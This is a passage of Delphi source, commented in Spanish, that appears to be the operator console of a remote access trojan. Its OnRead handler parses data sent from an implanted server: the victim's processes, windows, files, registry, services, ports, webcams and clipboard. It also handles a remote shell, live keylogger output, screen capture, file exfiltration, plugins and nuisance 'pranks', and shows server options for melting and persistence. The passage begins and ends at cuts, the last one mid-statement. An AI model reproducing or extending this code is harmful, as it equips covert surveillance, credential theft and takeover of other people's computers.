  MSGPosibles[48] := _('Se ha intentado detener el servicio');
  MSGPosibles[49] := _('Se ha intentado desinstalar el servicio');
  MSGPosibles[50] := _('Se ha intentado instalar el servicio');
  MSGPosibles[51] := _('Log eliminado con �xito');
  MSGPosibles[52] := _('Online Keylogger activado con �xito');
  MSGPosibles[53] := _('Online Keylogger desactivado con �xito');
  MSGPosibles[54] := _('Seteado portapapeles con �xito');
  MSGPosibles[55] := _('Se ha intentado cerrar la conexi�n');
  Self.DoubleBuffered := True; //Evita parpadeos
  Self.ListviewArchivos.DoubleBuffered := True;
  Self.ListViewBuscar.DoubleBuffered := True;
  Self.ListViewDescargas.DoubleBuffered := True;
  Self.ListViewProcesos.DoubleBuffered := True;
  Self.ListViewVentanas.DoubleBuffered := True;
  Self.ListViewRegistro.DoubleBuffered := True;
  Self.ListViewAudio.DoubleBuffered := True;
  Self.ListViewServicios.DoubleBuffered := True;
  Self.TreeViewRegedit.DoubleBuffered := True;
  recibiendofichero := False;
  Self.Height := 512; //Altura Predeterminada
  Self.Width := 591; //Anchura predeterminada
  if FormMain.ControlWidth > 0 then
    Self.Width := FormMain.ControlWidth;
  if FormMain.ControlHeight > 0 then
    Self.Height := FormMain.ControlHeight;
  Self.Position := poDesktopCenter; //Posici�n predeterminada
  PageControl.ActivePage := TabInfo; //iniciamos siempre en este tab
  PageControlInformacion.ActivePage := TabSheetServidor;
  PageControlArchivos.ActivePage := TabSheetVerArchivos;
  PageControlManagers.ActivePage := TabProcesos;
  PageControlVigilancia.ActivePage := TabScreencap;
end;

procedure TFormControl.Cargariconos(primeravez: Boolean);
var
  vFileInfo: TSHFileInfo;
  Fileinfo: SHFILEINFO;
  vImgList: THandle;
  TmpIconosGrandes, Tmp2IconosGrandes: TImageList;
  bit, nbit: TBitmap;
  i, tmpint, tmpint2, o: Integer;
  t: Boolean;
begin
  //Creaci�n de iconos
  FileIconInit(True);
  if primeravez then
    begin
      {Iconos peque�os para vsreport}
      vImgList := SHGetFileInfo(nil, FILE_ATTRIBUTE_NORMAL, vFileInfo, SizeOf(vFileInfo), SHGFI_ICON or SHGFI_SMALLICON or SHGFI_SYSICONINDEX);
      SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_SMALL, vImgList);
      SendMessage(listviewBuscar.Handle, LVM_SETIMAGELIST, LVSIL_SMALL, vImgList);
    end;

  {Iconos grandes para thumbnails}
  if primeravez then
    begin
      numeroiconos := 0;
      IconosGrandes := TImageList.Create(nil);
      IconosGrandes.Width := 96; {96x96, se puede cambiar si se desea}
      IconosGrandes.Height := 96;
    end
  else
    begin
      numeroiconos := 0;
      IconosGrandes.Clear;
    end;

  for o := 0 to listviewarchivos.Items.Count - 1 do //Para agregar los nuevo iconos que necesitemos
    begin
      SHGetFileInfo(PChar(UpperCase(ExtractFileExt(listviewarchivos.Items[o].Caption))), FILE_ATTRIBUTE_NORMAL, fileinfo, SizeOf(FileInfo), SHGFI_ICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
    end;

  TmpIconosGrandes := TImageList.Create(nil); {Estos son de 32x32 y hay que redimensionarlos}
  vImgList := SHGetFileInfo('', FILE_ATTRIBUTE_NORMAL, FileInfo, SizeOf(FileInfo), SHGFI_ICON or SHGFI_LARGEICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
  DestroyIcon(FileInfo.hIcon);
  TmpIconosGrandes.Handle := vImgList;
  TmpIconosGrandes.ShareImages := True;
  Tmp2IconosGrandes := TImageList.Create(nil);
  Tmp2IconosGrandes.Width := IconosGrandes.Width; {96x96, se puede cambiar si se desea}
  Tmp2IconosGrandes.Height := IconosGrandes.Height;
  for i := 0 to TmpIconosGrandes.Count - 1 do //tenemos que redimensionar los iconos del sistema
    begin
      try
        //sleep(10);  //si no se pone este sleep algunas veces no cargan todos los iconos
        bit := tbitmap.Create();
        nbit := tbitmap.Create();
        TmpIconosGrandes.GetBitmap(i, bit);
        nbit.Width := Tmp2IconosGrandes.Width;
        nbit.Height := Tmp2IconosGrandes.Height;

        //centramos el icono
        tmpint := (nbit.Height - bit.Height) div 2; //"top" de la esquina sup izq
        tmpint2 := (nbit.Width - bit.Width) div 2; //"left" de la esquina sup izq
        StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0, Bit.Width, Bit.Height, SRCCOPY);

        Tmp2IconosGrandes.Add(nbit, nil);
      finally
        bit.Free;
        nbit.Free;
        bit := nil;
        nbit := nil;
      end;
    end;
  IconosGrandes.Handle := Tmp2IconosGrandes.Handle;
  if primeravez then
    listviewarchivos.LargeImages := IconosGrandes;
end;

procedure TFormControl.OnRead(command: string; AThread: TIdPeerThread);
var
  Recibido, TempStr: string;
  Item: TListItem;
  i, a, o: Integer;
  RealSize: string;
  itemv: TSearchItem;
  PluginFile : file;
  Tamano : integer;
begin
  Recibido := Command;
  //FormMain.Caption := Recibido; //Para debug
  //Application.MessageBox(PChar(Recibido), 'Para debug', MB_OK + MB_ICONINFORMATION); //Para debug

  if Recibido = 'CONNECTED?' then
    Exit;
  if Pos('CONNECTED?', Recibido) > 0 then
    Delete(Recibido, Pos('CONNECTED?', Recibido), Length('CONNECTED?'));
  //Borra la String 'CONNECTED?'

  if Copy(Recibido, 1, 4) = 'PING' then
    begin
      if Servidor.Connection.Connected then
        Servidor.Connection.Writeln('PONG');
    end;

  if Copy(Recibido, 1, 4) = 'INFO' then
    begin
      Delete(Recibido, 1, 5); //Borramos INFO|
      for i := 0 to 9 do //10 items
        begin
          if i = 9 then //Tama�o de los discos duros recibido en bytes
            ListViewInformacion.Items[i].SubItems[0] :=
              ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, Pos('|', Recibido) - 1)))
          else
            ListViewInformacion.Items[i].SubItems[0] :=
              Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
      BtnRefrescarInformacion.Enabled := True;
    end;

  //Comandos relacionados con la gesti�n del servidor
  if Copy(Recibido, 1, 8) = 'SERVIDOR' then
    begin
      Delete(Recibido, 1, 9);
      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
      Delete(Recibido, 1, Pos('|', Recibido));
      //Informaci�n espec�fica del servidor
      if TempStr = 'INFO' then
        begin
          with ListViewServidor do
            begin
              //Versi�n
              Items[0].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
              //Nombre
              Items[1].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));

              Items[3].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));

              for i := 5 to 9 do
                begin
                  //bCopiar, NombreDeArchivo, Copiar a, melt, CopiarConFechaAnterior
                  Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
                  Delete(Recibido, 1, Pos('|', Recibido));
                end;
              for i := 11 to 12 do
                begin
                  //bPolicies, Nombre de la clave de Policies
                  Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
                  Delete(Recibido, 1, Pos('|', Recibido));
                end;
              for i := 14 to 15 do
                begin
                  //bPolicies, Nombre de la clave de Policies
                  Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
                  Delete(Recibido, 1, Pos('|', Recibido));
                end;

              //Ruta del servidor
              Items[17].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
              Delete(Recibido, 1, Pos('|', Recibido));
            end;
          BtnActualizarServidorInfo.Enabled := True;
        end;
    end;

  //Listar Procesos
  if Copy(Recibido, 1, 4) = 'PROC' then
    begin
      ListViewProcesos.Clear;
      Listviewprocesos.Items.beginupdate;
      Delete(Recibido, 1, 5);
      while Pos('|', Recibido) > 0 do
        begin
          Item := Listviewprocesos.Items.Add;
          Item.ImageIndex := 3; //imagen para que quede bonito XD
          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
          Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
          Delete(Recibido, 1, Pos('|', Recibido));
          TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
          //De la ruta de los procesos quitamos \??\ y sustituimos \SystemRoot\ por %windir%\
          TempStr := StringReplace(TempStr, '\??\', '', [rfReplaceAll]);
          if Copy(TempStr, 1, 12) = '\SystemRoot\' then
            TempStr := StringReplace(TempStr, '\SystemRoot\', '%windir%\', [rfReplaceAll]);
          Item.SubItems.Add(TempStr);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
      listviewprocesos.Items.endupdate;
      listviewprocesos.Width := listviewprocesos.Width + 1; //Para que desaparezca la scrollbar horizontal
      listviewprocesos.Width := listviewprocesos.Width - 1;
      BtnRefrescarProcesos.Enabled := True;
      ListviewProcesos.Enabled := True;
      Estado(_('Procesos listados'));
    end;
  //Listar Ventanas
  if Copy(Recibido, 1, 4) = 'WIND' then
    begin
      ListViewVentanas.Clear;
      Listviewventanas.Items.BeginUpdate;
      Delete(Recibido, 1, 5);
      while Pos('|', Recibido) > 0 do
        begin
          Item := ListViewVentanas.Items.Add;
          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1); //titulo
          Delete(Recibido, 1, Pos('|', Recibido));
          Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1)); //handle
          Delete(Recibido, 1, Pos('|', Recibido));

          case StrToIntDef(Copy(Recibido, 1, Pos('|', Recibido) - 1), 4) of
            0:
              begin
                item.ImageIndex := 65;
                Item.SubItems.Add(_('Oculta'));
              end;
            1:
              begin
                item.ImageIndex := 61;
                Item.SubItems.Add(_('Maximizada'));
              end;
            2:
              begin
                item.ImageIndex := 66;
                Item.SubItems.Add(_('Normal'));
              end;
            3:
              begin
                item.ImageIndex := 64;
                Item.SubItems.Add(_('Minimizada'));
              end;
            4:
              begin
                item.ImageIndex := 66;
                Item.SubItems.Add(_('Activa'));
              end;
          end;

          Delete(Recibido, 1, Pos('|', Recibido));
        end;
      Listviewventanas.Items.EndUpdate;
      Listviewventanas.Width := Listviewventanas.Width + 1; //Para que desaparezca la scrollbar horizontal
      Listviewventanas.Width := Listviewventanas.Width - 1;
      BtnRefrescarVentanas.Enabled := True;
      CheckBoxMostrarVentanasOcultas.Enabled := True;
      ListViewVentanas.Enabled := True;
      Estado(_('Ventanas listadas'));
    end;

  //Ir a proceso...
  //Sintaxis: WINPROC|HandleDeLaVentana|PIDDelProcesoDue�oDeLaVentana
  if Copy(Recibido, 1, 7) = 'WINPROC' then
    begin
      Delete(Recibido, 1, 8);
      //Mete en TempStr la handle
      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      if ListViewProcesos.Items.Count <= 0 then
        MessageBoxw(Handle,
          pwidechar(_('No se encontr� ning�n proceso listado. Debes actualizar la lista de procesos.')),
          'Error', MB_ICONERROR + MB_OK);
      if Recibido = '0' then
        begin
          MessageBoxw(Handle,
            pwidechar(_('No se encontr� ning�n proceso para la ventana. Es posible que el proceso ya haya sido cerrado.')
            +
            #13#10 + _('Actualice la lista de ventanas.')), 'Error', MB_ICONERROR + MB_OK);
        end
      else
        for i := 0 to ListViewProcesos.Items.Count - 1 do
          begin
            if ListViewProcesos.Items[i].SubItems[0] = Recibido then
              begin
                Estado(
                  _('La ventana con handle ') + TempStr + _(' pertenece al proceso "') +
                  ListViewProcesos.Items[i].Caption + _('" con PID ') + Recibido + '.');

                //Falso para asegurarse que se vea completamente el item
                PageControlManagers.ActivePage := TabProcesos;

                PageControlManagers.SetFocus;
                ListViewProcesos.SetFocus;
                ListViewProcesos.Items[i].MakeVisible(False);
                ListViewProcesos.Items[i].Selected := True;
                ListViewProcesos.Items[i].Focused := True;
                ListViewProcesos.SetFocus;
                //Para que aparezca automaticamente seleccionado en la ventana
                Break;
              end;
          end;
    end;

  //Mostrar Mensaje en la StatusBar
  if Copy(Recibido, 1, 3) = 'MSG' then
    begin
      Delete(Recibido, 1, 4);
      for i := 0 to 55 do
        Recibido := StringReplace(Recibido, '{' + IntToStr(i) + '}', MSGPosibles[i], [rfReplaceAll]);

      if Recibido = _('El directorio no existe!') then
        begin
          EditPathArchivos.Text :=
            Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
          EditPathArchivos.Text :=
            Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
          BtnActualizarArchivos.Enabled := True;
          ListviewArchivos.Enabled := True;
          CmbUnidades.Enabled := True;
          SpeedbuttonRutasRapidas.Enabled := True;
        end;
      Estado(Recibido);

    end;

  if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
    begin
      Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la string
      ListViewBromas.Items[0].SubItems[0] := Recibido;
      //0 porque es el primero en la ListViewBromas
    end;
  if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
    begin
      Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la string
      ListViewBromas.Items[1].SubItems[0] := Recibido;
    end;
  if Copy(Recibido, 1, 7) = 'ABRIRCD' then
    begin
      Delete(Recibido, 1, 8); //Borra ''ABRIRCD|' de la string
      ListViewBromas.Items[2].SubItems[0] := Recibido;
    end;
  if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
    begin
      Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la string
      ListViewBromas.Items[3].SubItems[0] := Recibido;
    end;

  if Copy(Recibido, 1, 11) = 'VERUNIDADES' then
    begin
      Delete(Recibido, 1, 12); //Borra 'VERUNIDADES|' de la string
      cmbUnidades.Items.Clear;
      while Pos('|', Recibido) > 1 do
        //Mayor que 1 porque hay un '|' al final de la cadena que se desprecia
        begin
          TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1)); //Unidad
          Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
          TempStr := TempStr + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1)); //Nombre
          Delete(Recibido, 1, Pos('|', Recibido));

          TempStr := TempStr + ' - ' + _('Espacio libre/total: ') +
            ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
          //Espacio disponible
          Delete(Recibido, 1, Pos('|', Recibido));
          TempStr := TempStr + ' / ' +
            ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
          //Espacio total
          Delete(Recibido, 1, Pos('|', Recibido));
          TempStr := TempStr + ' - ' + _('Formato:') + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));
          //Formato
          Delete(Recibido, 1, Pos('|', Recibido));
          case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el �ltimo caracter
            0: TempStr := TempStr + '-' + _('Unidad desconocida');
            2: TempStr := TempStr + '-' + _('Unidad removible');
            3: TempStr := TempStr + '-' + _('Disco duro');
            4: TempStr := TempStr + '-' + _('Disco de red');
            5: TempStr := TempStr + '-' + _('Unidad de CD/DVD');
            6: TempStr := TempStr + '-' + _('Disc RAM');
          end;
          cmbUnidades.Items.Add(TempStr);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
      cmbUnidades.Enabled := True;
      EditPathArchivos.Enabled := True;
      BtnActualizarArchivos.Enabled := True;
      ListviewArchivos.Enabled := True;
      SpeedbuttonRutasRapidas.Enabled := True;
      Estado(_('Unidades listadas.'));
      BtnVerUnidades.Enabled := True;
    end;

  if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
    begin
      Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'
      Delete(Recibido, 1, Pos('|', Recibido));

      ListViewArchivos.Items.BeginUpdate;
      ListViewArchivos.Clear; //Limpia primero...
      if Length(EditPathArchivos.Text) > 3 then
        begin
          Item := ListViewArchivos.Items.Add;
          Item.ImageIndex := 3;
          Item.Caption := '<..>';
        end;
      Estado(_('Listando directorio: ') + EditPathArchivos.Text);
      while Pos('|', Recibido) > 1 do
        begin
          if ParaDeListar then break;
          TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
          Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
          if TempStr[1] = #2 then //entonces le lleg� una carpeta
            begin
              Delete(TempStr, 1, 1); //borra el #2
              Item := ListViewArchivos.Items.Add;
              Item.ImageIndex := 3; //1 es el icono de carpeta cerrada
              Item.Caption := Copy(TempStr, 1, Pos(':', TempStr) - 1);
              Delete(TempStr, 1, Pos(':', Tempstr));

              Item.SubItems.Add('');
              Item.SubItems.Add(_('Carpeta de archivos'));
              Item.SubItems.Add(Copy(TempStr, 1, Pos(':', TempStr) - 1));

              Item.SubItems.Add(
                DateToStr(FileDateToDateTime(StrToIntDef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)), 1))) + ' ' +
                TimeToStr(FileDateToDateTime(StrToIntDef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)), 1)))
                );
              a := a + 1; //numero de carpetas
            end
          else //entonces es un archivo, saque tambien la informaci�n extra...
            begin
              Item := ListViewArchivos.Items.Add;
              Item.ImageIndex := IconNum(TempStr, True);
              Item.Caption := TempStr;

              if ((AnsiLowerCase(tempstr) = 'thumbs.db') and PrevisualizacionActiva and not receivingthumbfile) then
                begin
                  Receivingthumbfile := True;
                  if Servidor.Connection.connected then
                    Servidor.Connection.Writeln('GETFILE|' + EditPathArchivos.Text + tempstr);
                end;

              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
              Item.SubItems.Add(ObtenerMejorUnidad(StrToInt(TempStr)));
              RealSize := TempStr;
              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
              Item.SubItems.Add({TempStr}'Archivo'); //agrega el tipo
              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
              TempStr := StringReplace(TempStr, 'Lectura', _('Lectura'), [rfReplaceAll]);
              TempStr := StringReplace(TempStr, 'Oculto', _('Oculto'), [rfReplaceAll]);
              TempStr := StringReplace(TempStr, 'Lectura', _('Lectura'), [rfReplaceAll]);
              Item.SubItems.Add(TempStr); //agrega atributos
              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
              Item.SubItems.Add(DateToStr(FileDateToDateTime(StrToIntDef(tempstr, 1))) + ' ' +
                TimeToStr(FileDateToDateTime(StrToIntDef(tempstr, 1)))); //agrega la fecha
              Item.SubItems.Add(RealSize);
            end;
        end;
      LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
      LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(listviewarchivos.Items.Count - a - 1);
      Estado(_('Directorio listado!'));
      if PrevisualizacionActiva then
        cargariconos(False);
      ListViewArchivos.Items.EndUpdate;
      listviewarchivos.Width := listviewarchivos.Width + 1; //Para que desaparezca la scrollbar horizontal
      listviewarchivos.Width := listviewarchivos.Width - 1;
      BtnActualizarArchivos.Enabled := True;
      ListviewArchivos.Enabled := True;
      SpeedbuttonRutasRapidas.Enabled := True;
      ListviewArchivos.Enabled := True;
      CmbUnidades.Enabled := True;
    end;

  if Copy(Recibido, 1, 9) = 'GETFOLDER' then
    begin
      Delete(Recibido, 1, 9);
      while Pos('|', Recibido) > 0 do
        begin
          Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
          agregardescargaencola(TempStr, StrToIntDef(Copy(Recibido, 1, Pos('|', Recibido) - 1), 0));
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
    end;

  if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
    begin
      Delete(Recibido, 1, 13);
      { if Pos('|', Recibido) > 1 then
       begin
         TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
         Delete(Recibido, 1, Pos('|', Recibido));
       end;       }
      { while length(Recibido) < StrToInt(TempStr) do
       begin
         Recibido := Recibido + Trim(Athread.Connection.ReadLn);
       end;     }
      AniadirClavesARegistro(Recibido);
    end;
  if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
    begin
      Delete(Recibido, 1, 14);
      AniadirValoresARegistro(Recibido);
      Recibido := '';
      BtnVerRegisto.Enabled := True;
      Estado(_('Valores de la clave listados'));
    end;
  if Copy(Recibido, 1, 13) = 'LISTARWEBCAMS' then
    begin
      Delete(Recibido, 1, 14);
      ComboBoxWebcam.Clear;
      while Pos('|', Recibido) > 0 do
        begin
          ComboBoxWebcam.Items.Append(Copy(Recibido, 1, Pos('|', Recibido) - 1));
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
      Estado(_('Webcams listadas.'));
    end;

  if Pos('SHELL|', Recibido) = 1 then
    begin
      Delete(Recibido, 1, 6);
      if Recibido = 'ACTIVAR' then
        begin
          TabShell.Highlighted := True;
          MemoShell.Color := clBlack;
          MemoShell.Font.Color := clWhite;
          ComboBoxShellCommand.Color := clBlack;
          ComboBoxshellCommand.Font.Color := clWhite;
          ComboBoxShellCommand.Enabled := True;
          Estado(_('Shell correctamente activada'));
        end
      else if Recibido = 'DESACTIVAR' then
        begin
          //exit;
          TabShell.Highlighted := False;
          MemoShell.Color := ClInactiveBorder;
          MemoShell.Font.Color := clWhite;
          ComboBoxShellCommand.Color := ClInactiveBorder;
          ComboBoxshellCommand.Font.Color := clWhite;
          ComboBoxShellCommand.Enabled := False;
          Estado(_('Shell correctamente desactivada'));
        end
      else
        begin
          TempStr := StringReplace(Trim(Recibido), '|salto|', #10, [rfReplaceAll]);
          TempStr := StringReplace((Tempstr), '|salto2|', #13, [rfReplaceAll]);
          Memoshell.Lines.Append(Trim(Tempstr));
          SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, Length(Memoshell.Text));
        end;
    end;

  if Copy(Recibido, 1, 12) = 'SERVICIOSWIN' then
    begin
      Delete(Recibido, 1, 14); //es 14 porque los datos recibidos se inicia con un /
      // ejemplo : /alerter/alvg*..
      listviewservicios.Items.BeginUpdate;
      while Pos('|', Recibido) > 0 do
        begin
          Item := listviewservicios.Items.Add;
          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
          Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
          Delete(Recibido, 1, Pos('|', Recibido));
          Item.SubItems.Add(Copy(recibido, 1, Pos('|', Recibido) - 1));
          if (Copy(recibido, 1, Pos('|', Recibido) - 1) = 'Parado') then
            begin
              item.ImageIndex := 69;
              item.SubItems[1] := _('Parado');
            end
          else if (Copy(recibido, 1, Pos('|', Recibido) - 1) = 'Corriendo') then
            begin
              item.ImageIndex := 71;
              item.SubItems[1] := _('Corriendo');
            end
          else if (Copy(recibido, 1, Pos('|', Recibido) - 1) = 'Pausado') then
            begin
              item.ImageIndex := 70;
              item.SubItems[1] := _('Pausado');
            end
          else
            begin
              item.ImageIndex := 45;
            end;
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
      listviewservicios.Items.EndUpdate;
      listviewservicios.Width := listviewservicios.Width - 1; //Para eliminar la scrollvar horizontal
      listviewservicios.Width := listviewservicios.Width + 1;
      BtnServicios.Enabled := True;
      ListviewServicios.Enabled := True;
      Estado(_('Servicios listados'));
    end;

  if Copy(Recibido, 1, 15) = 'ESTADOKEYLOGGER' then
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
      if (Copy(Recibido, 1, Pos('|', Recibido) - 1) = 'ACTIVADO') then
        begin
          SpeedButtonRecibirLog.Enabled := True;
          SpeedButtonGuardarLog.Enabled := True;
          SpeedButtonEliminarLog.Enabled := True;
          ProgressBarKeylogger.Enabled := True;
          EditLogName.Enabled := False;
          SpeedButtonActivarKeylogger.Caption := _('Desactivar Keylogger');
          SpeedButtonActivarKeylogger.Enabled := True;
          CheckBoxOnlineKeylogger.Enabled := True;
        end
      else
        begin
          SpeedButtonRecibirLog.Enabled := False;
          SpeedButtonGuardarLog.Enabled := False;
          SpeedButtonEliminarLog.Enabled := False;
          ProgressBarKeylogger.Enabled := False;
          EditLogName.Enabled := True;
          SpeedButtonActivarKeylogger.Caption := _('Activar Keylogger');
          SpeedButtonActivarKeylogger.Enabled := True;
          CheckBoxOnlineKeylogger.Enabled := False;
        end;
      Delete(Recibido, 1, Pos('|', Recibido));
      if (Copy(Recibido, 1, Pos('|', Recibido) - 1) <> '') then
        EditLogName.Text := Extractfilename(Copy(Recibido, 1, Pos('|', Recibido) - 1));
    end;

  if Copy(Recibido, 1, 13) = 'NEWKEYLOGKEYS' then
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
      Recibido := StringReplace((Recibido), '|salto|', #10, [rfReplaceAll]);
      Recibido := StringReplace((Recibido), '|salto2|', #13, [rfReplaceAll]);
      Recibido := StringReplace((Recibido), '|espacio|', ' ', [rfReplaceAll]);
      RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
      AgregarARichEdit(Recibido);
    end;

  if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
      AnchuraPantalla := StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
      AlturaPantalla := StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1));
    end;

  if Copy(Recibido, 1, 6) = 'SEARCH' then
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
      if Copy(Recibido, 1, 5) = 'STOPS' then //Paramos...
        begin
          TabSheetBuscar.highlighted := False;
          TabFileManager.highlighted := False;
          SpeedButtonBuscar.Caption := _('Comenzar');
          SpeedButtonBuscar.Enabled := True;
          EditBuscar.Enabled := True;
          Estado(_('Busqueda parada'));
        end
      else if Copy(Recibido, 1, 6) = 'FINISH' then //Terminado!
        begin
          SpeedButtonBuscar.Caption := _('Comenzar');
          SpeedButtonBuscar.Enabled := True;
          EditBuscar.Enabled := True;
          Estado(_('Busqueda finalizada'));
          TabSheetBuscar.highlighted := False;
          TabFileManager.highlighted := False;
        end
      else
        begin
          if ParaDeBuscar then Exit;

          { while pos('|', Recibido) > 0 do
           begin   }
          if (Encontrados > 50000) then Exit; //WTFFF!!!
          SearchItems[encontrados].Nombre := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
          SearchItems[encontrados].TamanioReal := StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1));
          SearchItems[encontrados].Tamanio := ObtenerMejorUnidad(StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1)));
          Delete(Recibido, 1, Pos('|', Recibido));
          SearchItems[encontrados].Tipo := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          SearchItems[encontrados].Atributos := '';
          Delete(Recibido, 1, Pos('|', Recibido));
          SearchItems[encontrados].Fechamodify := StrToIntDef(Copy(Recibido, 1, Pos('|', Recibido) - 1), 1);
          Delete(Recibido, 1, Pos('|', Recibido));
          Encontrados := Encontrados + 1;

        end; //fin while
      //end;
    end;

  if Copy(Recibido, 1, 6) = 'GORUTA' then
    begin
      Delete(Recibido, 1, Pos('|', Recibido));
      EditPathArchivos.Text := trim(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      BtnActualizarArchivos.Click;
    end;

  // Portapapeles!
  if Copy(Recibido, 1, 7) = 'GETCLIP' then
    begin
      Delete(Recibido, 1, 8);
      TempStr := StringReplace(Trim(Recibido), '|salto|', #10, [rfReplaceAll]);
      TempStr := StringReplace((Tempstr), '|salto2|', #13, [rfReplaceAll]);
      MemoClipBoard.Text := TempStr;
      SpeedButtonClipBoard1.Enabled := True;
      Estado(_('Portapapeles recibido'));
    end;

  if Copy(Recibido, 1, 11) = 'GETADRIVERS' then
    begin
      Delete(Recibido, 1, 12);
      ComboBoxAudioDevices.Items.Clear; //Primero limpiamos los que hab�a
      while Pos('|', Recibido) > 0 do
        begin
          ComboBoxAudioDevices.Items.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
      SpeedButtonListarAudio.Enabled := True;
      Estado(_('Dispositivos de audio listados'));
    end;

  if Copy(Recibido, 1, 6) = 'TCPUDP' then
    begin
      ListviewPuertos.Clear;
      Delete(Recibido, 1, 7);
      while Pos('|', recibido) > 0 do
        begin
          item := ListviewPuertos.Items.Add;
          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);

          Delete(Recibido, 1, Pos('|', Recibido));
          for i := 0 to 6 do
            begin
              Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
              Delete(Recibido, 1, Pos('|', Recibido));
            end;
        end;
      Estado('Escaneo de Puerto Finalizado..');
      ListviewPuertos.Enabled := True;
      BtnRefrescarPuertos.Enabled := True;
      CheckBoxPuertos.Enabled := True;
    end;


    
    if Copy(Recibido, 1, 12) = 'PLUGINLOADED' then  //El plugin acaba de ser cargado
    begin
      Delete(Recibido, 1, 13);
      i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),-1);
